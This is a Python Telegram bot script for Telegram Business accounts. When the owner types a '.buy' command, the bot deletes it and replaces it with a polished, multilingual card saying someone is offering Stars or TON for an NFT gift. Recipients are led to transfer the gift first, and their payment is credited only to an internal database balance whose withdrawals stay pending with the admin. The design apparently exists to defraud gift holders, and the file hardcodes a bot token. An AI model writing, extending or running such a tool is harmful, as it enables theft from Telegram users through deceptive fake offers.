import asyncio
import logging
import json
import os
import re
import secrets
import string
import time
from decimal import Decimal, InvalidOperation

import aiosqlite

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest, TelegramRetryAfter
from aiogram.methods import DeleteBusinessMessages, SendMessage, EditMessageText
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    LinkPreviewOptions,
    Message,
)

# ============================================================
# НАСТРОЙКИ
# ============================================================

BOT_TOKEN = "9271241618:AAFNh_Z36MJgNzHIIPH-El2lnQT7hY3DoM4"

DEFAULT_LANGUAGE = "ru"
ACCEPT_FIRST = False
USE_PREMIUM_EMOJI = True
STARS_PREMIUM_EMOJI_ID = "5848021027782661221"
GRAM_PREMIUM_EMOJI_ID = "5318901904686754959"
ADMIN_ID = 5198310704
DB_PATH = "access.db"
PARALLEL = True

ADMIN_STATES = {}
USER_STATES = {}
OFFERS = {}
BOT_USERNAME = None

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
logger = logging.getLogger(__name__)

TEXTS = {
    "ru": {
        "offer": "Пользователь предлагает вам\n<b>{amount} {currency}</b> за подарок {nft}.\n\n",
        "accept": "Принять",
        "decline": "Отклонить",
        "cancelled": "❌ <b>Предложение отклонено</b>",
    },
    "en": {
        "offer": "The user is offering you\n<b>{amount} {currency}</b> for the gift {nft}.\n\n",
        "accept": "Accept",
        "decline": "Decline",
        "cancelled": "❌ <b>Offer declined</b>",
    },
    "ar": {
        "offer": "يقدم لك المستخدم\n<b>{amount} {currency}</b> مقابل الهدية {nft}.\n\n",
        "accept": "قبول",
        "decline": "رفض",
        "cancelled": "❌ <b>تم رفض العرض</b>",
    },
    "zh": {
        "offer": "用户向您提供\n<b>{amount} {currency}</b> 购买礼物 {nft}。\n\n",
        "accept": "接受",
        "decline": "拒绝",
        "cancelled": "❌ <b>报价已拒绝</b>",
    },
}


def currency_emoji_html(currency_key):
    if currency_key == "gram":
        return f'<tg-emoji emoji-id="{GRAM_PREMIUM_EMOJI_ID}">💎</tg-emoji>'
    return f'<tg-emoji emoji-id="{STARS_PREMIUM_EMOJI_ID}">⭐️</tg-emoji>'


def currency_label(currency_key):
    return "TON" if currency_key == "gram" else "Stars"


# ============================================================
# БАЗА
# ============================================================

async def db_connect():
    db = await aiosqlite.connect(DB_PATH)
    db.row_factory = aiosqlite.Row
    return db


async def init_db():
    db = await db_connect()
    try:
        await db.executescript("""
        CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT NOT NULL);
        CREATE TABLE IF NOT EXISTS internal_users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, added_at INTEGER NOT NULL, last_seen INTEGER NOT NULL);
        CREATE TABLE IF NOT EXISTS user_offers (
            order_id TEXT PRIMARY KEY, owner_user_id INTEGER NOT NULL, data_json TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'active', message_id INTEGER, connection_id TEXT, chat_id INTEGER,
            expires_at INTEGER NOT NULL, created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL
        );
        CREATE TABLE IF NOT EXISTS user_settings (
            user_id INTEGER PRIMARY KEY, language TEXT NOT NULL DEFAULT 'ru',
            timer_hours INTEGER NOT NULL DEFAULT 6, notifications INTEGER NOT NULL DEFAULT 1,
            created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL
        );
        CREATE TABLE IF NOT EXISTS user_balances (
            user_id INTEGER PRIMARY KEY, stars REAL NOT NULL DEFAULT 0, ton REAL NOT NULL DEFAULT 0, updated_at INTEGER NOT NULL
        );
        CREATE TABLE IF NOT EXISTS withdrawals (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER NOT NULL, currency TEXT NOT NULL,
            amount REAL NOT NULL, address TEXT, status TEXT NOT NULL DEFAULT 'pending',
            created_at INTEGER NOT NULL, processed_at INTEGER
        );
        """)
        await db.commit()
    finally:
        await db.close()


async def register_internal_user(user_id, username=None, first_name=None):
    if not user_id:
        return
    db = await db_connect()
    try:
        now = int(time.time())
        await db.execute(
            "INSERT INTO internal_users(user_id,username,first_name,added_at,last_seen) VALUES(?,?,?,?,?) "
            "ON CONFLICT(user_id) DO UPDATE SET username=excluded.username, first_name=excluded.first_name, last_seen=excluded.last_seen",
            (int(user_id), username, first_name, now, now),
        )
        await db.commit()
    finally:
        await db.close()


async def ensure_user_settings(user_id):
    now = int(time.time())
    db = await db_connect()
    try:
        await db.execute(
            "INSERT OR IGNORE INTO user_settings(user_id,language,timer_hours,notifications,created_at,updated_at) VALUES(?,?,?,?,?,?)",
            (user_id, DEFAULT_LANGUAGE, 6, 1, now, now),
        )
        await db.commit()
        cur = await db.execute("SELECT * FROM user_settings WHERE user_id=?", (user_id,))
        return await cur.fetchone()
    finally:
        await db.close()


async def get_user_settings(user_id):
    return await ensure_user_settings(user_id)


async def set_user_setting(user_id, field, value):
    if field not in {"language", "timer_hours", "notifications"}:
        return
    await ensure_user_settings(user_id)
    db = await db_connect()
    try:
        await db.execute(f"UPDATE user_settings SET {field}=?, updated_at=? WHERE user_id=?", (value, int(time.time()), user_id))
        await db.commit()
    finally:
        await db.close()


async def ensure_balance(user_id):
    db = await db_connect()
    try:
        now = int(time.time())
        await db.execute("INSERT OR IGNORE INTO user_balances(user_id, stars, ton, updated_at) VALUES(?, 0, 0, ?)", (user_id, now))
        await db.commit()
        cur = await db.execute("SELECT * FROM user_balances WHERE user_id=?", (user_id,))
        return await cur.fetchone()
    finally:
        await db.close()


async def get_balance(user_id):
    row = await ensure_balance(user_id)
    return {"stars": float(row["stars"] or 0), "ton": float(row["ton"] or 0)}


async def add_balance(user_id, stars=0, ton=0):
    await ensure_balance(user_id)
    db = await db_connect()
    try:
        now = int(time.time())
        await db.execute(
            "UPDATE user_balances SET stars = stars + ?, ton = ton + ?, updated_at = ? WHERE user_id = ?",
            (float(stars), float(ton), now, user_id),
        )
        await db.commit()
    finally:
        await db.close()


async def save_user_offer(order_id, owner_user_id, data, status, message_id, connection_id, chat_id, expires_at):
    db = await db_connect()
    try:
        now = int(time.time())
        await db.execute(
            "INSERT OR REPLACE INTO user_offers(order_id,owner_user_id,data_json,status,message_id,connection_id,chat_id,expires_at,created_at,updated_at) "
            "VALUES(?,?,?,?,?,?,?,?,?,?)",
            (order_id, owner_user_id, json.dumps(data, ensure_ascii=False), status, message_id, connection_id, chat_id, int(expires_at), now, now),
        )
        await db.commit()
    finally:
        await db.close()


async def update_user_offer_status(order_id, status):
    db = await db_connect()
    try:
        await db.execute("UPDATE user_offers SET status=?, updated_at=? WHERE order_id=?", (status, int(time.time()), order_id))
        await db.commit()
    finally:
        await db.close()


async def get_user_offer(order_id):
    db = await db_connect()
    try:
        cur = await db.execute("SELECT * FROM user_offers WHERE order_id=?", (order_id,))
        return await cur.fetchone()
    finally:
        await db.close()


async def get_user_offers(user_id, limit=30):
    db = await db_connect()
    try:
        cur = await db.execute("SELECT * FROM user_offers WHERE owner_user_id=? ORDER BY created_at DESC LIMIT ?", (user_id, limit))
        return await cur.fetchall()
    finally:
        await db.close()


# ============================================================
# NFT / .BUY
# ============================================================

NFT_REGEX = re.compile(r"^(?:https?://)?t\.me/nft/([A-Za-z0-9_-]+)$", re.IGNORECASE)


def parse_nft(url):
    url = url.strip()
    match = NFT_REGEX.match(url)
    if not match:
        return None
    slug = match.group(1)
    match = re.match(r"^(.+)-(\d+)$", slug)
    if not match:
        return None
    return {"slug": slug, "name": match.group(1).replace("-", " "), "number": match.group(2), "url": "https://t.me/nft/" + slug}


def parse_buy_command(text):
    parts = text.strip().split()
    if len(parts) < 3 or parts[0].lower() != ".buy":
        return None
    nft_url, amount_raw = parts[1], parts[2]
    try:
        amount_value = float(amount_raw)
        if amount_value <= 0:
            return None
    except ValueError:
        return None
    amount = str(int(amount_value)) if amount_value.is_integer() else str(amount_value)
    currency, language, timer_hours = "stars", DEFAULT_LANGUAGE, 6
    for argument in parts[3:]:
        arg = argument.lower()
        if arg in ("stars", "star", "tt"):
            currency = "stars"
        elif arg in ("gram", "ton"):
            currency = "gram"
        elif arg in ("ru", "en", "ar", "zh", "cn", "kit"):
            language = arg if arg in ("ru", "en", "ar") else "zh"
        elif arg in ("6", "6h", "6ч"):
            timer_hours = 6
        elif arg in ("12", "12h", "12ч"):
            timer_hours = 12
    nft = parse_nft(nft_url)
    if nft is None:
        return None
    return {"nft": nft, "amount": amount, "currency": currency, "language": language, "timer_hours": timer_hours, "buyer": None}


def generate_order_id():
    return "TG-" + "".join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(8))


def create_offer(data, premium=True, order_id=""):
    lang = TEXTS[data["language"]]
    nft_html = f'<a href="{data["nft"]["url"]}">{data["nft"]["name"]} #{data["nft"]["number"]}</a>'
    text = lang["offer"].format(
        amount=data["amount"],
        currency=currency_emoji_html(data["currency"]) if premium else ("⭐️" if data["currency"] == "stars" else "💎"),
        nft=nft_html,
    )
    accept_btn = InlineKeyboardButton(text=lang["accept"], callback_data=f"offer_accept:{data['language']}:{order_id}")
    decline_btn = InlineKeyboardButton(text=lang["decline"], callback_data=f"offer_decline:{data['language']}:{order_id}")
    row = [accept_btn, decline_btn] if ACCEPT_FIRST else [decline_btn, accept_btn]
    return text, InlineKeyboardMarkup(inline_keyboard=[row])


def get_buyer_profile_url(data):
    username = data.get("buyer_username")
    if not username:
        buyer = str(data.get("buyer") or "").lstrip("@")
        if buyer and not str(buyer).isdigit():
            username = buyer
    if username:
        return f"https://t.me/{username}"
    buyer_id = data.get("buyer_id")
    if not buyer_id:
        buyer = str(data.get("buyer") or "").lstrip("@")
        if str(buyer).isdigit():
            buyer_id = buyer
    if buyer_id:
        return f"tg://user?id={buyer_id}"
    return None


def create_deal_card_text(data, status_line=""):
    from html import escape
    nft = data.get("nft", {})
    currency = (data.get("currency") or "stars").lower()
    amount = escape(str(data.get("amount", "")))
    name = escape(str(nft.get("name", "NFT")))
    number = escape(str(nft.get("number", "")))
    order = escape(str(data.get("order_id") or ""))
    asset = currency_label(currency)
    emoji = currency_emoji_html(currency)
    gift = f"{name} #{number}"
    nft_url = escape(str(nft.get("url") or ""), quote=True)
    linked_gift = f'<a href="{nft_url}">{gift}</a>' if nft_url else gift
    buyer_raw = str(data.get("buyer") or "не указан")
    profile_url = get_buyer_profile_url(data)
    if profile_url and str(profile_url).startswith("https://"):
        buyer_html = f'<a href="{profile_url}">{escape(buyer_raw)}</a>'
    else:
        buyer_html = escape(buyer_raw)

    lines = [
        f"<b>Сделка — #{order}</b>",
        "",
        f"Покупатель предложил <b>{amount} {emoji} {asset}</b>",
        f"за подарок {linked_gift}.",
        "",
        f"Покупатель: {buyer_html}",
    ]
    if status_line:
        lines += ["", status_line]
    return "\n".join(lines)


def create_accept_chat_text(data):
    """Текст в чате после Accept — только обновление сообщения, бот сам не пишет"""
    base = create_deal_card_text(data)
    return (
        base + "\n\n"
        "<b>Статус:</b> оффер принят\n\n"
        "<b>Инструкция по передаче NFT</b>\n\n"
        "1. Проверьте данные сделки.\n"
        "2. Передайте подарок покупателю (профиль → ⋮ → Отправить подарок).\n"
        "3. Откройте сделку в боте и подтвердите передачу.\n"
        "4. После подтверждения покупателя средства поступят на баланс."
    )


def create_seller_bot_text(data):
    base = create_deal_card_text(data)
    return (
        base + "\n\n"
        "━━━━━━━━━━━━━━━━\n"
        "<b>Инструкция</b>\n\n"
        "1. Передайте NFT покупателю.\n"
        "2. Нажмите <b>«Я передал NFT»</b>.\n"
        "3. Дождитесь подтверждения покупателя.\n"
        "4. Средства поступят на баланс после подтверждения обеих сторон."
    )


def create_buyer_bot_text(data):
    base = create_deal_card_text(data)
    return (
        base + "\n\n"
        "━━━━━━━━━━━━━━━━\n"
        "<b>Продавец подтвердил передачу NFT</b>\n\n"
        "Проверьте получение подарка.\n"
        "Если всё верно — нажмите <b>«Подтвердить получение»</b>."
    )


def language_from_callback(data):
    parts = data.split(":")
    return parts[1] if len(parts) >= 2 and parts[1] in TEXTS else DEFAULT_LANGUAGE


def order_id_from_callback(data):
    return data.split(":", 2)[2] if len(data.split(":")) >= 3 else ""


def bot_deal_url(order_id):
    global BOT_USERNAME
    uname = BOT_USERNAME or "bot"
    return f"https://t.me/{uname}?start=deal_{order_id}"


# ============================================================
# UI
# ============================================================

def user_panel_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 Профиль", callback_data="user_profile")],
        [InlineKeyboardButton(text="Создать оффер", style="success", callback_data="user_create_offer")],
        [InlineKeyboardButton(text="Мои офферы", callback_data="user_offers")],
        [InlineKeyboardButton(text="Статистика", callback_data="user_stats")],
        [InlineKeyboardButton(text="Быстрые команды", callback_data="user_quick_commands")],
        [InlineKeyboardButton(text="Настройки", callback_data="user_settings")],
    ])


def offer_status_label(status):
    return {
        "active": "активен",
        "accepted": "принят",
        "seller_confirmed": "ждёт покупателя",
        "completed": "завершён",
        "declined": "отклонён",
        "expired": "истёк",
    }.get(status, status)


def user_offers_keyboard(rows):
    buttons = []
    for row in rows[:8]:
        label = f"{row['order_id']} — {offer_status_label(row['status'])}"
        buttons.append([InlineKeyboardButton(text=label, callback_data=f"user_offer:{row['order_id']}")])
    buttons.append([InlineKeyboardButton(text="Назад", callback_data="user_panel")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


async def render_user_panel(message, edit=False):
    text = (
        "<b>Главное меню</b>\n\n"
        "Управление сделками и балансом.\n"
        "Оффер: <code>.buy https://t.me/nft/Name-123 100</code> в Business-чате."
    )
    if edit:
        await message.edit_text(text, reply_markup=user_panel_keyboard())
    else:
        await message.answer(text, reply_markup=user_panel_keyboard())


# ============================================================
# БОТ
# ============================================================

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())


async def edit_original_offer_message(callback: CallbackQuery, text: str, reply_markup=None, link_preview_options=None):
    try:
        if callback.message.business_connection_id:
            return await callback.bot(EditMessageText(
                business_connection_id=callback.message.business_connection_id,
                chat_id=callback.message.chat.id,
                message_id=callback.message.message_id,
                text=text,
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup,
                link_preview_options=link_preview_options,
            ))
        return await callback.message.edit_text(
            text, parse_mode=ParseMode.HTML, reply_markup=reply_markup, link_preview_options=link_preview_options
        )
    except Exception as e:
        logger.error("EDIT ERROR: %s", e)


# ============================================================
# BUSINESS .BUY
# ============================================================

@dp.business_message()
async def handle_business_message(message: Message):
    connection_id = message.business_connection_id
    if not connection_id or not message.text or not message.chat or message.chat.type != "private":
        return
    command = message.text.strip()
    if not command.lower().startswith(".buy"):
        return

    try:
        conn = await bot.get_business_connection(business_connection_id=connection_id)
        owner = conn.user
        await register_internal_user(owner.id, owner.username, owner.first_name)
        await ensure_balance(owner.id)
    except Exception:
        return

    data = parse_buy_command(command)
    if data is None:
        return

    settings = await get_user_settings(owner.id)
    args_lower = [part.lower() for part in command.split()[3:]]
    explicit_lang = any(part in {"ru", "en", "ar", "zh", "cn", "kit"} for part in args_lower)
    explicit_timer = any(part in {"6", "6h", "6ч", "12", "12h", "12ч"} for part in args_lower)
    if not explicit_lang and settings["language"] in TEXTS:
        data["language"] = settings["language"]
    if not explicit_timer and int(settings["timer_hours"]) in (6, 12):
        data["timer_hours"] = int(settings["timer_hours"])

    data["buyer"] = f"@{message.from_user.username}" if message.from_user.username else str(message.from_user.id)
    data["buyer_id"] = message.from_user.id
    data["buyer_username"] = message.from_user.username
    data["owner_user_id"] = owner.id

    order_id = generate_order_id()
    data["order_id"] = order_id
    OFFERS[order_id] = dict(data)

    async def delete_command():
        try:
            await bot(DeleteBusinessMessages(business_connection_id=connection_id, message_ids=[message.message_id]))
        except Exception:
            pass

    async def send_offer():
        use_premium = USE_PREMIUM_EMOJI
        for _ in range(3):
            offer_text, keyboard = create_offer(data, premium=use_premium, order_id=order_id)
            try:
                sent = await bot(SendMessage(
                    chat_id=message.chat.id,
                    text=offer_text,
                    business_connection_id=connection_id,
                    reply_markup=keyboard,
                    link_preview_options=LinkPreviewOptions(is_disabled=False, url=data["nft"]["url"], show_above_text=True),
                ))
                OFFERS[order_id].update({
                    "message_id": sent.message_id,
                    "connection_id": connection_id,
                    "owner_user_id": owner.id,
                    "chat_id": message.chat.id,
                    "expires_at": 4102444800,
                })
                await save_user_offer(order_id, owner.id, data, "active", sent.message_id, connection_id, message.chat.id, 4102444800)
                return
            except TelegramRetryAfter as e:
                await asyncio.sleep(e.retry_after)
            except TelegramBadRequest:
                if use_premium:
                    use_premium = False
                    continue
                return

    if PARALLEL:
        await asyncio.gather(delete_command(), send_offer())
    else:
        await delete_command()
        await send_offer()


# ============================================================
# ACCEPT / DECLINE — бот сам НЕ пишет в личку
# ============================================================

@dp.callback_query(F.data.startswith("offer_decline"))
async def decline_offer(callback: CallbackQuery):
    language = language_from_callback(callback.data)
    order_id = order_id_from_callback(callback.data)
    try:
        await edit_original_offer_message(callback, TEXTS[language]["cancelled"])
        await callback.answer()
        if order_id:
            await update_user_offer_status(order_id, "declined")
    except Exception as e:
        await callback.answer(f"Ошибка: {str(e)[:100]}", show_alert=True)


@dp.callback_query(F.data.startswith("offer_accept"))
async def accept_offer(callback: CallbackQuery):
    order_id = order_id_from_callback(callback.data)
    data = OFFERS.get(order_id)
    if not data:
        row = await get_user_offer(order_id)
        if row:
            data = json.loads(row["data_json"])
    if not data:
        await callback.answer("Оффер не найден или устарел.", show_alert=True)
        return

    seller_id = callback.from_user.id
    data["seller_id"] = seller_id
    data["seller_username"] = callback.from_user.username
    data["status"] = "accepted"
    OFFERS[order_id] = dict(data)

    # Deep link в бота
    global BOT_USERNAME
    if not BOT_USERNAME:
        me = await bot.get_me()
        BOT_USERNAME = me.username
    deep_link = bot_deal_url(order_id)

    # Только обновляем сообщение в чате + кнопка-ссылка в бота
    # Бот сам никуда не пишет
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Открыть сделку в боте", url=deep_link)],
    ])

    try:
        await edit_original_offer_message(
            callback,
            text=create_accept_chat_text(data),
            reply_markup=kb,
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
        await update_user_offer_status(order_id, "accepted")
        await save_user_offer(
            order_id,
            data.get("owner_user_id") or seller_id,
            data,
            "accepted",
            data.get("message_id"),
            data.get("connection_id"),
            data.get("chat_id"),
            data.get("expires_at") or 4102444800,
        )
    except Exception as e:
        logger.exception("ACCEPT EDIT ERROR | %s", e)

    await callback.answer()


# ============================================================
# /start — deep link deal_
# ============================================================

@dp.message(F.text.startswith("/start"))
async def start_command(message: Message):
    await register_internal_user(message.from_user.id, message.from_user.username, message.from_user.first_name)
    await ensure_balance(message.from_user.id)
    await ensure_user_settings(message.from_user.id)

    parts = (message.text or "").split(maxsplit=1)
    payload = parts[1].strip() if len(parts) > 1 else ""

    if payload.startswith("deal_"):
        order_id = payload[5:]
        data = OFFERS.get(order_id)
        status = None
        if not data:
            row = await get_user_offer(order_id)
            if row:
                data = json.loads(row["data_json"])
                status = row["status"]
        else:
            status = data.get("status") or "accepted"

        if data:
            if status is None:
                status = data.get("status") or "accepted"

            is_seller = (
                data.get("seller_id") == message.from_user.id
                or (not data.get("seller_id") and status in ("accepted", "seller_confirmed", "completed"))
            )
            is_buyer = data.get("buyer_id") == message.from_user.id

            if is_seller and not is_buyer:
                if status == "seller_confirmed":
                    await message.answer(
                        create_deal_card_text(data, "<b>Статус:</b> вы подтвердили передачу.\nОжидаем покупателя.")
                    )
                elif status == "completed":
                    await message.answer(create_deal_card_text(data, "<b>Статус:</b> сделка завершена."))
                else:
                    kb = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="Я передал NFT", style="success", callback_data=f"seller_confirm:{order_id}")],
                    ])
                    await message.answer(create_seller_bot_text(data), reply_markup=kb)
                return

            if is_buyer:
                if status == "seller_confirmed":
                    kb = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="Подтвердить получение", style="success", callback_data=f"buyer_confirm:{order_id}")],
                    ])
                    await message.answer(create_buyer_bot_text(data), reply_markup=kb)
                elif status == "completed":
                    await message.answer(create_deal_card_text(data, "<b>Статус:</b> сделка завершена."))
                else:
                    await message.answer(create_deal_card_text(data, "<b>Статус:</b> ожидание передачи NFT продавцом."))
                return

            # если роли неясны — показать карточку продавца с кнопкой
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Я передал NFT", style="success", callback_data=f"seller_confirm:{order_id}")],
            ])
            await message.answer(create_seller_bot_text(data), reply_markup=kb)
            return

    if message.from_user.id == ADMIN_ID:
        await message.answer("<b>Админ.</b> /admin — панель.")
    await render_user_panel(message)


@dp.message(F.text == "/menu")
async def menu_command(message: Message):
    await ensure_balance(message.from_user.id)
    await render_user_panel(message)


# ============================================================
# ДВУХШАГОВОЕ ПОДТВЕРЖДЕНИЕ
# ============================================================

@dp.callback_query(F.data.startswith("seller_confirm:"))
async def seller_confirm(callback: CallbackQuery):
    order_id = callback.data.split(":", 1)[1]
    data = OFFERS.get(order_id)
    if not data:
        row = await get_user_offer(order_id)
        if row:
            data = json.loads(row["data_json"])
            data["status"] = row["status"]
    if not data:
        await callback.answer("Сделка не найдена.", show_alert=True)
        return

    if data.get("seller_id") and callback.from_user.id != data.get("seller_id"):
        await callback.answer("Только продавец может подтвердить передачу.", show_alert=True)
        return

    data["seller_id"] = callback.from_user.id
    data["status"] = "seller_confirmed"
    OFFERS[order_id] = dict(data)
    await update_user_offer_status(order_id, "seller_confirmed")
    await save_user_offer(
        order_id, data.get("owner_user_id") or callback.from_user.id, data, "seller_confirmed",
        data.get("message_id"), data.get("connection_id"), data.get("chat_id"), data.get("expires_at") or 4102444800,
    )

    await callback.answer("Передача подтверждена. Ожидаем покупателя.", show_alert=True)
    try:
        await callback.message.edit_text(
            create_deal_card_text(data, "<b>Статус:</b> вы подтвердили передачу NFT.\nОжидаем подтверждения покупателя."),
            reply_markup=None,
        )
    except Exception:
        pass

    # Покупателю — только если он уже писал боту (иначе Telegram не даст написать первым)
    # По ТЗ бот сам не пишет: покупатель открывает бота по ссылке из чата /start deal_
    # Поэтому здесь НЕ шлём сообщение покупателю автоматически.


@dp.callback_query(F.data.startswith("buyer_confirm:"))
async def buyer_confirm(callback: CallbackQuery):
    order_id = callback.data.split(":", 1)[1]
    data = OFFERS.get(order_id)
    if not data:
        row = await get_user_offer(order_id)
        if row:
            data = json.loads(row["data_json"])
            data["status"] = row["status"]
    if not data:
        await callback.answer("Сделка не найдена.", show_alert=True)
        return

    if data.get("status") != "seller_confirmed":
        await callback.answer("Сначала продавец должен подтвердить передачу.", show_alert=True)
        return

    if data.get("buyer_id") and callback.from_user.id != data.get("buyer_id"):
        await callback.answer("Только покупатель может подтвердить получение.", show_alert=True)
        return

    seller_id = data.get("seller_id")
    currency = (data.get("currency") or "stars").lower()
    try:
        amount = float(data.get("amount") or 0)
    except Exception:
        amount = 0

    stars_add = amount if currency == "stars" else 0
    ton_add = amount if currency == "gram" else 0

    if seller_id:
        await add_balance(seller_id, stars=stars_add, ton=ton_add)
        bal = await get_balance(seller_id)
    else:
        bal = {"stars": 0, "ton": 0}

    data["status"] = "completed"
    OFFERS[order_id] = dict(data)
    await update_user_offer_status(order_id, "completed")

    asset = currency_label(currency)
    await callback.answer("Сделка завершена!", show_alert=True)
    try:
        await callback.message.edit_text(
            create_deal_card_text(data, f"<b>Статус:</b> сделка завершена.\nПродавцу начислено <b>{amount} {asset}</b>."),
            reply_markup=None,
        )
    except Exception:
        pass

    # Продавцу можно написать только если он уже открывал бота — это ответ на его действие, ок
    if seller_id:
        try:
            from html import escape
            nft = data.get("nft", {})
            gift = f"{escape(str(nft.get('name', 'NFT')))} #{escape(str(nft.get('number', '')))}"
            await bot.send_message(
                seller_id,
                f"<b>✅ Сделка завершена</b>\n\n"
                f"Оффер <code>{order_id}</code>\n"
                f"Подарок: {gift}\n"
                f"Начислено: <b>{amount} {asset}</b>\n\n"
                f"Баланс: ⭐ <b>{bal['stars']}</b> | 💎 <b>{bal['ton']}</b>",
            )
        except Exception:
            pass


# ============================================================
# ПРОФИЛЬ / ВЫВОД
# ============================================================

@dp.callback_query(F.data == "user_panel")
async def user_panel_callback(callback: CallbackQuery):
    await render_user_panel(callback.message, edit=True)
    await callback.answer()


@dp.callback_query(F.data == "user_profile")
async def user_profile_callback(callback: CallbackQuery):
    bal = await get_balance(callback.from_user.id)
    text = (
        f"<b>Профиль</b>\n\n"
        f"ID: <code>{callback.from_user.id}</code>\n"
        f"⭐ Stars: <b>{bal['stars']}</b>\n"
        f"💎 TON: <b>{bal['ton']}</b>"
    )
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💸 Вывод", style="success", callback_data="user_withdraw")],
        [InlineKeyboardButton(text="Назад", callback_data="user_panel")],
    ])
    await callback.message.edit_text(text, reply_markup=keyboard)
    await callback.answer()


@dp.callback_query(F.data == "user_withdraw")
async def user_withdraw_callback(callback: CallbackQuery):
    bal = await get_balance(callback.from_user.id)
    text = f"<b>Вывод</b>\n\n⭐ Stars: <b>{bal['stars']}</b>\n💎 TON: <b>{bal['ton']}</b>"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Вывести Stars", callback_data="withdraw_stars")],
        [InlineKeyboardButton(text="Вывести TON", callback_data="withdraw_ton")],
        [InlineKeyboardButton(text="Назад", callback_data="user_profile")],
    ])
    await callback.message.edit_text(text, reply_markup=keyboard)
    await callback.answer()


@dp.callback_query(F.data == "withdraw_stars")
async def withdraw_stars_callback(callback: CallbackQuery):
    bal = await get_balance(callback.from_user.id)
    if bal["stars"] <= 0:
        return await callback.answer("Недостаточно Stars", show_alert=True)
    USER_STATES[callback.from_user.id] = {"action": "withdraw_stars_amount", "max": bal["stars"]}
    await callback.message.edit_text(
        f"<b>Вывод Stars</b>\n\nДоступно: <b>{bal['stars']}</b>\n\nНапишите сумму.\n/cancel — отмена"
    )
    await callback.answer()


@dp.callback_query(F.data == "withdraw_ton")
async def withdraw_ton_callback(callback: CallbackQuery):
    bal = await get_balance(callback.from_user.id)
    if bal["ton"] <= 0:
        return await callback.answer("Недостаточно TON", show_alert=True)
    USER_STATES[callback.from_user.id] = {"action": "withdraw_ton_amount", "max": bal["ton"]}
    await callback.message.edit_text(
        f"<b>Вывод TON</b>\n\nДоступно: <b>{bal['ton']}</b>\n\nНапишите сумму.\n/cancel — отмена"
    )
    await callback.answer()


@dp.message(F.text == "/cancel")
async def cancel_command(message: Message):
    USER_STATES.pop(message.from_user.id, None)
    if message.from_user.id == ADMIN_ID:
        ADMIN_STATES.pop(message.from_user.id, None)
    await message.answer("Отменено.")


@dp.message(F.text.regexp(r"^\d+([.,]\d+)?$"))
async def handle_amount_input(message: Message):
    state = USER_STATES.get(message.from_user.id)
    if not state:
        return
    action = state.get("action")
    try:
        amount = float(message.text.replace(",", "."))
    except Exception:
        return await message.answer("Неверная сумма.")
    if amount <= 0:
        return await message.answer("Сумма должна быть больше 0.")

    if action == "withdraw_stars_amount":
        if amount > state.get("max", 0):
            return await message.answer(f"Максимум: {state.get('max')}")
        USER_STATES[message.from_user.id] = {"action": "withdraw_stars_confirm", "amount": amount}
        await message.answer(f"Вывести <b>{amount} Stars</b>?\nНапишите <code>да</code> или /cancel")
    elif action == "withdraw_ton_amount":
        if amount > state.get("max", 0):
            return await message.answer(f"Максимум: {state.get('max')}")
        USER_STATES[message.from_user.id] = {"action": "withdraw_ton_address", "amount": amount}
        await message.answer(f"Сумма: <b>{amount} TON</b>\n\nНапишите TON-адрес.\n/cancel — отмена")
    elif action == "withdraw_ton_address":
        address = message.text.strip()
        if len(address) < 20 or " " in address:
            return await message.answer("Неверный TON-адрес.")
        amount = state.get("amount", 0)
        bal = await get_balance(message.from_user.id)
        if amount > bal["ton"]:
            USER_STATES.pop(message.from_user.id, None)
            return await message.answer("Недостаточно средств.")
        await add_balance(message.from_user.id, ton=-amount)
        db = await db_connect()
        try:
            await db.execute(
                "INSERT INTO withdrawals(user_id, currency, amount, address, status, created_at) VALUES(?,?,?,?,?,?)",
                (message.from_user.id, "ton", amount, address, "pending", int(time.time())),
            )
            await db.commit()
        finally:
            await db.close()
        USER_STATES.pop(message.from_user.id, None)
        await message.answer(f"✅ Заявка на <b>{amount} TON</b>\nАдрес: <code>{address}</code>")
        try:
            await bot.send_message(ADMIN_ID, f"<b>Вывод TON</b>\nUser: <code>{message.from_user.id}</code>\n{amount} → <code>{address}</code>")
        except Exception:
            pass


@dp.message(F.text.lower().in_({"да", "yes"}))
async def handle_yes(message: Message):
    state = USER_STATES.get(message.from_user.id)
    if not state or state.get("action") != "withdraw_stars_confirm":
        return
    amount = state.get("amount", 0)
    bal = await get_balance(message.from_user.id)
    if amount > bal["stars"]:
        USER_STATES.pop(message.from_user.id, None)
        return await message.answer("Недостаточно Stars.")
    await add_balance(message.from_user.id, stars=-amount)
    db = await db_connect()
    try:
        await db.execute(
            "INSERT INTO withdrawals(user_id, currency, amount, address, status, created_at) VALUES(?,?,?,?,?,?)",
            (message.from_user.id, "stars", amount, None, "pending", int(time.time())),
        )
        await db.commit()
    finally:
        await db.close()
    USER_STATES.pop(message.from_user.id, None)
    await message.answer(f"✅ Заявка на <b>{amount} Stars</b>. Вам начислят алмазы/кольца.")
    try:
        await bot.send_message(ADMIN_ID, f"<b>Вывод Stars</b>\nUser: <code>{message.from_user.id}</code>\n{amount} Stars")
    except Exception:
        pass


# ============================================================
